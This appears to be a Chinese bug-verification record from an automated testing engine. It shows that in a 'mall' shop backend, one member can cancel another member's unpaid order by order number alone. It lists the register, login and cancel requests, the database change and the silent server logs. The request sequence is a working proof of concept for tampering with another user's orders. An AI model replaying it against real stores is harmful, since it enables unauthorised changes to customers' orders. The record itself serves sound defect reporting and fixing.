# A19 修前接口直证（素材取自引擎留痕）

缺陷：会员 B 凭订单号取消会员 A 的待付款订单成功。
环境：master @ dcaa93b，mall-portal:8085。复现日期 2026-10-10。
引擎判定：mall-admin 项目轮 1，job 2549，实例 #47891 FAIL（钉桩 ORD-04）。

## 请求/响应原文（引擎留痕，会员 B 令牌）

1) 造数：注册会员 B

POST /sso/register
{"username": "mbr_o04b1009235408", "password": "RegMbr@2026", "telephone": "13915612485", "authCode": "172698"}
→ {"code": 200, "message": "注册成功"}

2) 会员 B 登录

POST /sso/login
{"username": "mbr_o04b1009235408", "password": "RegMbr@2026"}
→ {"code": 200, "message": "操作成功", "data": {"tokenHead": "Bearer ", "token": "..."}}

3) 会员 B 取消会员 A 的订单（orderId=151 为会员 A 所下待付款订单）

POST /order/cancelUserOrder?orderId=151
（Authorization: B 令牌）
→ {"code": 200, "message": "操作成功"}

## 数据库核对

oms_order.id=151：member_id=（A 的会员id），status 由 0（待付款）变为 4（已关闭）。

## 服务端日志

复现时段 mall-portal 日志无异常堆栈（0 行）——服务端静默放行，无归属校验。
